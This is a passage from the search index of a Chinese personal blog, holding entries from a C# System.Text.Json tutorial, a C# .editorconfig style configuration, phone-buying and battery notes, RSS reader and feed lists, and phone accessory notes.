PropertyNameCaseInsensitive = true, // 默认允许从string中读取数字 NumberHandling = JsonNumberHandling.AllowReadingFromString, // 默认驼峰,可以 UpperCaseNamingPolicy:JsonNamingPolicy 然后重写 public override string ConvertName(string name) =\u003ename.ToUpper();来修改 PropertyNamingPolicy = JsonNamingPolicy.CamelCase, // 对象内部驼峰 \"AB\":{\"aB\":1,\"bB\":1} DictionaryKeyPolicy = JsonNamingPolicy.CamelCase, // enum用名称,而不是数字表示 Converters = { new JsonStringEnumConverter(JsonNamingPolicy.CamelCase) } // 从源生成中获取类型转换信息 TypeInfoResolver = JsonContext.Default }; ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:6:0","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#jsonserializeroptions-对象"},{"categories":["blog"],"content":" 相关特性 attribute这些特性都是用在 POCO/实例类的. ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:7:0","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#相关特性-attribute"},{"categories":["blog"],"content":" 自定义转化名称 JsonPropertyName [JsonPropertyName(\"Wind\")] public int WindSpeed { get; set; } How to customize property names and values with System.Text.Json - .NET | Microsoft Learn ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:7:1","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#自定义转化名称-jsonpropertyname"},{"categories":["blog"],"content":" 必须存在 JsonRequired [JsonRequired] public int WindSpeed { get; set; } Require properties for deserialization - .NET | Microsoft Learn ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:7:2","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#必须存在-jsonrequired"},{"categories":["blog"],"content":" 忽略 ignore常用 [JsonIgnore]: 总是忽略 [JsonIgnore(Condition = JsonIgnoreCondition.Never)]: 永远显示, 是 JsonSerializerOptions 对象中, DefaultIgnoreCondition,IgnoreReadOnlyProperties, IgnoreReadOnlyFields 的默认值 [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]: null 就忽略 [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingDefault)]: 忽略 null 或者值类型的默认值 (例如 int 默认值是 0 ) How to ignore properties with System.Text.Json - .NET | Microsoft Learn ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:7:3","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#忽略-ignore"},{"categories":["blog"],"content":" 多余字段 JsonExtensionData [JsonExtensionData] public Dictionary\u003cstring, JsonElement\u003e? ExtensionData { get; set; } How to handle overflow JSON or use JsonElement or JsonNode in System.Text.Json - .NET | Microsoft Learn ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:7:4","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#多余字段-jsonextensiondata"},{"categories":["blog"],"content":" 不规范的 json 字符串下面是一些可能遇到的情况: 不传递值, 会使用实体类的默认值. 所以实体类如果不能为 null, 一定要配置默认值. null 会破坏代码中不允许为 null 的问题. 需要 等待这个讨论完结 来最终加入一个新的 jsonserializerOptions 选项或者 特殊处理. 因此建议在 json 字符串中去掉值为 null 的数据! 也可以不管这些, 通过用户提交的数据进行验证避免错误. 因为用户请求是一定要进行验证的. // 不标准的json // 不完整的json,缺少的字段默认值 var j1 = \"\"\"{\"Name\": \"ken\"}\"\"\"; var j11 = JsonSerializer.Deserialize(j1, JsonContext.Default.Person); // 带null的json // age为null报错. // name为null则会传递到对象里,即使Name不允许为null值 var j2 = \"\"\"{\"Name\": null,\"Age\":4}\"\"\"; var j22 = JsonSerializer.Deserialize(j2, JsonContext.Default.Person); // 多余的字段不受影响.正常默认值 var j3 = \"\"\"{\"HHH\":null}\"\"\"; var j33 = JsonSerializer.Deserialize(j3, JsonContext.Default.Person); ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:8:0","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#不规范的-json-字符串"},{"categories":["blog"],"content":" 不常用的东西 处理引用和循环引用 使用 Utf8JsonWriter 和 Utf8JsonReader 这样的低级 api 处理 json, 甚至可以处理不完整或残缺的字符串 var options = new JsonWriterOptions { Indented = true }; using var stream = new MemoryStream(); using var writer = new Utf8JsonWriter(stream, options); writer.WriteStartObject(); writer.WriteString(\"date\", DateTimeOffset.UtcNow); writer.WriteNumber(\"temp\", 42); // writer.WriteEndObject(); // 不输出结尾的大括号 writer.Flush(); var json = Encoding.UTF8.GetString(stream.ToArray()); Console.WriteLine(json); // 读取这个不完整的json // 因为最后的42没有截止符,无法读取 var reader = new Utf8JsonReader(Encoding.UTF8.GetBytes(json),isFinalBlock:false,state:default); while (reader.Read()) { Console.WriteLine(reader.TokenType); if (reader.TokenType == JsonTokenType.PropertyName) { var property = reader.GetString(); if (property == \"date\") { reader.Read(); Console.WriteLine(reader.GetDateTime()); } } } ","date":"2023-09-27","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/:9:0","series":null,"tags":["blog","csharp"],"title":"csharp的json教程","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%9A%84json%E6%95%99%E7%A8%8B/#不常用的东西"},{"categories":["blog"],"content":"csharp 的编码配置 .editorconfig 文件.","date":"2023-09-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC/","series":null,"tags":["blog","csharp"],"title":"csharp编码风格","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC/"},{"categories":["blog"],"content":" 简介csharp 的编码配置 .editorconfig 文件. 官网编码风格 主要有 3 种类别: Language rules 语言规则 Formatting rules 格式规则 Naming rules 命名规则 Miscellaneous rules 杂项规则, 基本用不上 ","date":"2023-09-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC/:1:0","series":null,"tags":["blog","csharp"],"title":"csharp编码风格","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC/#简介"},{"categories":["blog"],"content":" 强制启用项目 csproj 加入 EnforceCodeStyleInBuild 为 true. 详情链接 ","date":"2023-09-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC/:2:0","series":null,"tags":["blog","csharp"],"title":"csharp编码风格","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC/#强制启用"},{"categories":["blog"],"content":" 配置警告dotnet_style_readonly_field = true:suggestion 配置警告参考链接 只有 vs 可以理解 :\u003cseverity-level\u003e 编译器只能理解 dotnet_diagnostic.\u003crule-ID\u003e.severity = \u003cseverity-level\u003e ","date":"2023-09-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC/:3:0","series":null,"tags":["blog","csharp"],"title":"csharp编码风格","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC/#配置警告"},{"categories":["blog"],"content":" 配置文件项目根路径创建 .editorconfig 文件. # only record change root = true [*] # space instead tab indent_style = space charset = utf-8 # trim end trim_trailing_whitespace = true # insert \"\\n\" to end insert_final_newline = true [*.{csproj,vbproj,vcxproj,vcxproj.filters,proj,projitems,shproj}] indent_size = 2 [*.{props,targets,ruleset,config,nuspec,resx,vsixmanifest,vsct}] indent_size = 2 [*.json] indent_size = 2 [*.{ps1,psm1}] indent_size = 4 [*.{razor,cshtml}] charset = utf-8-bom # no check [*.g.cs] generated_code = false [*.cs] # tab = 4 space tab_width = 4 # indent = 4 space indent_size = 4 ###################################################################################################################################################################################### # Language rules # simple code dotnet_diagnostic.IDE0001.severity = warning dotnet_diagnostic.IDE0002.severity = warning # don't use \"this.\" dotnet_diagnostic.IDE0003.severity = warning # always use var dotnet_diagnostic.IDE0007.severity = warning csharp_style_var_for_built_in_types = true csharp_style_var_when_type_is_apparent = true csharp_style_var_elsewhere = true # better read your \"swith code\" dotnet_diagnostic.IDE0010.severity = warning # even 1 line code use \"{}\" dotnet_diagnostic.IDE0011.severity = warning csharp_prefer_braces = true # remove namespce \"{}\" dotnet_diagnostic.IDE0161.severity = warning csharp_style_namespace_declarations = file_scoped ###################################################################################################################################################################################### # Naming rules dotnet_diagnostic.IDE1006.severity = warning # \u003ckind\u003e.\u003centityName\u003e.\u003cpropertyName\u003e = \u003cpropertyValue\u003e # dotnet_naming_rule dotnet_naming_rule.interface_should_be_begins_with_i.severity = suggestion dotnet_naming_rule.interface_should_be_begins_with_i.symbols = interface dotnet_naming_rule.interface_should_be_begins_with_i.style = begins_with_i dotnet_naming_rule.types_should_be_pascal_case.severity = suggestion dotnet_naming_rule.types_should_be_pascal_case.symbols = types dotnet_naming_rule.types_should_be_pascal_case.style = pascal_case dotnet_naming_rule.non_field_members_should_be_pascal_case.severity = suggestion dotnet_naming_rule.non_field_members_should_be_pascal_case.symbols = non_field_members dotnet_naming_rule.non_field_members_should_be_pascal_case.style = pascal_case # dotnet_naming_symbols dotnet_naming_symbols.interface.applicable_kinds = interface dotnet_naming_symbols.interface.applicable_accessibilities = public, internal, private, protected, protected_internal, private_protected dotnet_naming_symbols.interface.required_modifiers = dotnet_naming_symbols.types.applicable_kinds = class, struct, interface, enum dotnet_naming_symbols.types.applicable_accessibilities = public, internal, private, protected, protected_internal, private_protected dotnet_naming_symbols.types.required_modifiers = dotnet_naming_symbols.non_field_members.applicable_kinds = property, event, method dotnet_naming_symbols.non_field_members.applicable_accessibilities = public, internal, private, protected, protected_internal, private_protected dotnet_naming_symbols.non_field_members.required_modifiers = # dotnet_naming_style dotnet_naming_style.begins_with_i.required_prefix = I dotnet_naming_style.begins_with_i.required_suffix = dotnet_naming_style.begins_with_i.word_separator = dotnet_naming_style.begins_with_i.capitalization = pascal_case dotnet_naming_style.pascal_case.required_prefix = dotnet_naming_style.pascal_case.required_suffix = dotnet_naming_style.pascal_case.word_separator = dotnet_naming_style.pascal_case.capitalization = pascal_case dotnet_naming_style.pascal_case.required_prefix = dotnet_naming_style.pascal_case.required_suffix = dotnet_naming_style.pascal_case.word_separator = dotnet_naming_style.pascal_case.capitalization = pascal_case ######################################################################################","date":"2023-09-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC/:4:0","series":null,"tags":["blog","csharp"],"title":"csharp编码风格","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC/#配置文件"},{"categories":["blog"],"content":" 简介记录我在手机选择过程中关注的点. ","date":"2023-09-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/:1:0","series":null,"tags":["电子产品","blog"],"title":"手机选择","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/#简介"},{"categories":["blog"],"content":" 评分 对比项 看重程度 Android IOS 说明 自定义程度 4 3 3 自定义组件和 UI。icon，图标放在任意位置？ 苹果有熄屏页编辑 + 堆叠小组件 特性 5 5 3 做更多的事情。跳过开屏广告。游戏模式, 双开，字幕，小窗,拍照好看, 交通卡, 散热？ 苹果只有一个快捷指令能打 容易使用 5 3 5 推送好用. 应用商店 (chatgpt) 好用, 从第三方 apk 下载可能有病毒。同步游戏进度!不折腾？应用跳转和密码管理 缩放友好,小米开发友好? 更新支持 5 3 5 系统版本更新久, 约等于用的久. 苹果对比小米更新时间久, 且统一更新. 而小米需要分批次 第三方 app 支持 5 3 5 carplay 等第三方 APP 对苹果支持度高。例如 office，谷歌，而且 bug 更少。还有灵动岛适配, 小组件适配等等 兴奋点 5 5 3 通常是新的功能. 开源应用? 快充? 信号? 折叠? 大模型? 生态连接 5 4 4 耳机 + 平板 + 电脑 + 汽车 虽然体验不如苹果, 但小米有 iot 和汽车. 成本 4 3 2 价格并不是 5 分满分因素, 因为作为科技最高产物之一. 购买却并不是那么吃力. 价格安卓有优势, 但加上折旧和使用年限. 并没有很夸张的优势 合计 29 30 ","date":"2023-09-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/:2:0","series":null,"tags":["电子产品","blog"],"title":"手机选择","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/#评分"},{"categories":["blog"],"content":" 苹果购买的权重 内存大小 15 promax 第一次 8 g 未来 2 年的外观变化 芯片发热/散热, 能效. 关系到续航, 降亮度. 15promax 这一代拉跨 功能变化其实很小 苹果 macbook air 开始就可以接入单个 4 k 144 显示器了 ","date":"2023-09-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/:3:0","series":null,"tags":["电子产品","blog"],"title":"手机选择","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/#苹果购买的权重"},{"categories":["blog"],"content":" 生态","date":"2023-09-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/:4:0","series":null,"tags":["电子产品","blog"],"title":"手机选择","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/#生态"},{"categories":["blog"],"content":" 苹果 苹果设备购买建议网站 MacRumors Buyer’s Guide: Know When to Buy iPhone, Mac, iPad 发布多久了, 下一代是不是会马上出来 发布时间 VR 生态! quest 3 都可以 留给 iPhone 的时间，还有三年：iPhone 15 系列深度解析 - 少数派 (sspai.com) 打开iOS新世界的大门 | 有趣的URL Scheme - 少数派 (sspai.com) 小组件 添加计时器桌面. 多久时间内拿起过手机. 减少拿手机的事件? https://sspai.com/post/83531 待机显示小组件 社区速递 014 | 交互式小组件、预制菜和派友的维修经历 - 少数派 (sspai.com) APP App Store 上的“顶瓜瓜 - 坐姿提醒健康颈椎” (apple.com) 我做了个带壳截屏，截图美化工具，【NiceShots】3周后获得苹果的官方推荐 - 少数派 (sspai.com) ","date":"2023-09-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/:4:1","series":null,"tags":["电子产品","blog"],"title":"手机选择","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/#苹果"},{"categories":["blog"],"content":" Actions：快捷指令专属应用新花样 ","date":"2023-09-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/:4:2","series":null,"tags":["电子产品","blog"],"title":"手机选择","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/#actions快捷指令专属应用新花样"},{"categories":["blog"],"content":" 言论 苹果 有前瞻性. 即使产品不是最新推出的, 但却定义标准. 为行业指明方向. 例如 VP ,腾讯关闭的 VR 团队解散后因为 VP 重建了. 国内 VR 一下子活跃了起来 手机操作方式定义了标准. 耳机也定义了标准 ipad 和 mac 也都有自己独特的一面. 一种散文的方式写苹果. 文章组织的不错, 但是大家的评论都觉得没什么内在. 失望三年后恰好相见：闲话 iPhone 15 Pro - 少数派 https://www.v2ex.com/t/986659 同为多年 iPhone 用户转小米，用了半年多已经完全适应了，目前感受 ios 的交互体验有种“塑造需求”的感觉，ios 那些精致的动画、流畅的动效、清脆的振动和交互其实都是鸡肋，缺了后就体会到并不是必须的。当然如果心里一直惦记着这份“精致优雅”或者苹果带来的消费实力符号，就永远会感觉到纠结，那还是继续用 iPhone 好。而安卓带来的稳定信号、长续航、快充、通话自动录音、白菜价的大存储，才是实实在在的体验提升。-11 楼 用用就适应了，我倒是双持，偶尔会用用 iPhone ，iOS 的文本选中，简直太恶心了，还有自带的输入法。这方面感觉 android 更清爽，iOS 就是黏糊糊的感觉，再配合上黏糊糊的动画，差点意思 -27 楼 **对应 11 楼,\" 优雅 \" 也可以是 \" 黏糊糊 “, \" 安卓的傻快会更清爽 “. PS: 如果安卓能解决卡顿的话 ** 请稍候… 苹果很克制，安卓很放纵。克制会有统一感，或者说美感，放纵会惊奇。你可以自己选择 ","date":"2023-09-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/:5:0","series":null,"tags":["电子产品","blog"],"title":"手机选择","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/#言论"},{"categories":["blog"],"content":" 细节 小米 14 阉割 n79 频段.. 14pro 有, iPhone 有, 华为旗舰有… 去广告 游戏账号系统，如果上了移动端，那肯定有玩体验更好 深色模式？ 自动任务：锁频关 clash ","date":"2023-09-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/:6:0","series":null,"tags":["电子产品","blog"],"title":"手机选择","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/#细节"},{"categories":["blog"],"content":" 电池 快充不会加大电池损耗 一直插着电线没什么关系. 想怎么充怎么冲. 快到 80% 就建议更换电池了, 因为厂商的策略, 会主动降低性能. 那么 iPhone 我就不开保持电量 80%, 因为快到 80% 就建议要更换了. 那我岂不是一直用 80% 电量?! 小米就无所谓了, 反正换电池便宜. 如果一定要设置的话. 我觉得: 设置晚上自动开启省电模式 我设置充到 90%. 因为和上面一条冲突, 所以早上起来还是会充到 100%. 但是日常导航之类的发热情况, 最后 10% 充电很慢, 对电池也不友好. 所以平时充到 90%, 晚上睡觉充到 100%. 没有你精神损耗大… ","date":"2023-09-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/:7:0","series":null,"tags":["电子产品","blog"],"title":"手机选择","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/#电池"},{"categories":["blog"],"content":" 小米充电功率 充电只有百分比，10 w 以内 出现快速充电，18 w 以内 出现 mi turbo，22w 25w 以上，出现小数点 相关来源: 【何同学】快充伤电池？40部手机两年实验，告诉你最佳充电方式_哔哩哔哩_bilibili ","date":"2023-09-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/:7:1","series":null,"tags":["电子产品","blog"],"title":"手机选择","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/#小米"},{"categories":["blog"],"content":" 系统 miui 替换法-哔哩哔哩_Bilibili ","date":"2023-09-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/:8:0","series":null,"tags":["电子产品","blog"],"title":"手机选择","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E9%80%89%E6%8B%A9/#系统"},{"categories":["blog"],"content":" 简介","date":"2023-09-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/rss%E4%BD%BF%E7%94%A8/:1:0","series":null,"tags":["blog"],"title":"RSS使用","uri":"/posts/%E7%AC%94%E8%AE%B0/rss%E4%BD%BF%E7%94%A8/#简介"},{"categories":["blog"],"content":" 为什么需要 RSS信息茧房: 男性和女性的评论区不一样？算法连这也不放过 - cnBeta.COM 移动版 ","date":"2023-09-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/rss%E4%BD%BF%E7%94%A8/:2:0","series":null,"tags":["blog"],"title":"RSS使用","uri":"/posts/%E7%AC%94%E8%AE%B0/rss%E4%BD%BF%E7%94%A8/#为什么需要-rss"},{"categories":["blog"],"content":" RSS 客户端 移动端 yang991178/fluent-reader-lite 所有平台 安卓客户端 Releases · Ashinch/ReadYou (github.com) 苹果 Ranchero-Software/NetNewsWire: RSS reader for macOS and iOS. (github.com) 万物皆可RSSHub 桌面端 跨平台 raven-reader 跨平台 fluent-reader 苹果 NetNewsWire 自部署 web 端 commafeed FreshRSS, php 写的 miniflux, go 写的 selfoss nkanaev/yarr Tiny Tiny RSS (tt-rss.org), php 写的 Grafana 也可以订阅 rss 并展示 RSS/Atom plugin for Grafana | Grafana Labs 主流平台 Feedly, 老牌生态好. 100 feed, 3 个文件夹. 内容列表嵌入广告 Inoreader – Build your own newsfeed Pc 是站点, 有移动端. 内容嵌入广告. 功能比 feedly 多. 移动端没有底部导航栏, 使用不习惯 (不方便) NewsBlur 样式比较老, 64 个站点订阅. 不订阅一次只能看 3 篇文章, 可以专注, 但不实用…. reeder苹果收费 苹果平台最好的 Feeder, 200 免费订阅, 无广告 QiReader 30 个订阅有点少 FeedMe (RSS Reader | Podcast) - Apps on Google Play 可以使用 feedly 账号.. 仅安卓 可参考教程 重新捡起RSS：RSSHub + FreshRSS 建立信息流 (l3zc.com) 用Miniflux自建轻便好用的RSS服务 (zoomyale.com) ","date":"2023-09-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/rss%E4%BD%BF%E7%94%A8/:3:0","series":null,"tags":["blog"],"title":"RSS使用","uri":"/posts/%E7%AC%94%E8%AE%B0/rss%E4%BD%BF%E7%94%A8/#rss-客户端"},{"categories":["blog"],"content":" RSS 订阅源 新闻 ithome 快科技(原驱动之家)–科技改变未来 (mydrivers.com) 奇客资讯网 钛媒体 tmtpost.com/rss theverge 学习 bbc 学英语 feeds.bbci.co.uk/learningenglish/english/features/6-minute-english/rss b 站每周必看 https://rsshub.app/bilibili/weekly 知乎热榜 https://rsshub.app/zhihu/hotlist 捕蛇者说 二分电台 代码之外 因为记性不好, 我不喜欢的也记录一下 忽左忽右 大内密探 谐星聊天会 ","date":"2023-09-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/rss%E4%BD%BF%E7%94%A8/:4:0","series":null,"tags":["blog"],"title":"RSS使用","uri":"/posts/%E7%AC%94%E8%AE%B0/rss%E4%BD%BF%E7%94%A8/#rss-订阅源"},{"categories":["blog"],"content":" 临时记录","date":"2023-09-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/rss%E4%BD%BF%E7%94%A8/:5:0","series":null,"tags":["blog"],"title":"RSS使用","uri":"/posts/%E7%AC%94%E8%AE%B0/rss%E4%BD%BF%E7%94%A8/#临时记录"},{"categories":["blog"],"content":" iphonefeedly 同步设置 b 站配置在浏览器打开. 列表点击=\u003e打开网页=\u003eapp 内打开 电脑端在 b 站页面打开 美团 金山词霸ok Feeder 不能为每个内容设置打开方式… 可以订阅 twitter, 但是需要收费. 例如订阅源直接添加 https://www.twitter.com/elonmusk 电脑用 full 模式,更好用. 金山词霸兼容不好 美团 ok b 站 ok 手机用 full b站ok 美团ok 金山词霸兼容不好 NetNewsWire b站点链接直接跳转 默认是simple模式 同步有一些问题,对接feedly,不如feedly好用 ","date":"2023-09-11","objectID":"/posts/%E7%AC%94%E8%AE%B0/rss%E4%BD%BF%E7%94%A8/:5:1","series":null,"tags":["blog"],"title":"RSS使用","uri":"/posts/%E7%AC%94%E8%AE%B0/rss%E4%BD%BF%E7%94%A8/#iphone"},{"categories":["blog"],"content":" 简介为什么会有这篇文章? 因为手机是现代最为重要的移动载体. 如何更好的使用它, 发挥它的最大的效力非常重要. [!info] 其实苹果的配件, 很多都可以套用在其他大销量机型上. 例如 MagSafe手机壳/配件, 贴膜 等等. ","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:1:0","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#简介"},{"categories":["blog"],"content":" 手机壳 magsafe磁吸+孔散热 苹果官网手机壳 https://m.cnbeta.com.tw/view/1383543.htm , 都有 magsafe 功能. 手机壳是不是不会影响到下面的磁吸充电宝?!! 针织的效果好? 图拉斯有气垫手机壳加 magsafe 支撑环 军工级别防摔手机壳, 有哪些推荐? - V2EX ","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:2:0","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#手机壳"},{"categories":["blog"],"content":" 支架 手指支架,可压缩! 液态硅胶磁吸指环支架-邦克仕Benks 泡泡骚TESTV定制款手机气囊支架 多色可选伸缩粘贴式 popsockets-淘宝网 (taobao.com) ","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:3:0","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#支架"},{"categories":["blog"],"content":" 充电","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:4:0","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#充电"},{"categories":["blog"],"content":" 充电线","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:4:1","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#充电线"},{"categories":["blog"],"content":" 充电器 首页-ISDT艾斯特-淘宝网 (taobao.com) 苹果快充PD30W-Anker安克) Magsafe 官方 799 的外置电池兼容性更好??? 参考 testv视频. 有一个问题. 这样的磁吸电池是不是支持手机壳? 苹果Magsafe磁吸无线充电宝-Anker安克 磁吸充电 有带支架的版本 ","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:4:2","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#充电器"},{"categories":["blog"],"content":" 贴膜","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:5:0","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#贴膜"},{"categories":["blog"],"content":" 定位器定位器可以帮助你更好的贴膜. 位置准确, 不进灰尘等等. ","date":"2023-09-10","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/:5:1","series":null,"tags":["电子产品","blog"],"title":"手机周边生态","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E5%91%A8%E8%BE%B9%E7%94%9F%E6%80%81/#定位器"},{"categories":["blog"],"content":" 手机膜类型 防窥膜: 降亮度 + 降分辨率太厉害, 看手机费劲 康宁玻璃: 航天玻璃, iphone 推荐 AGC: 做汽车玻璃, 保时捷汽车推荐 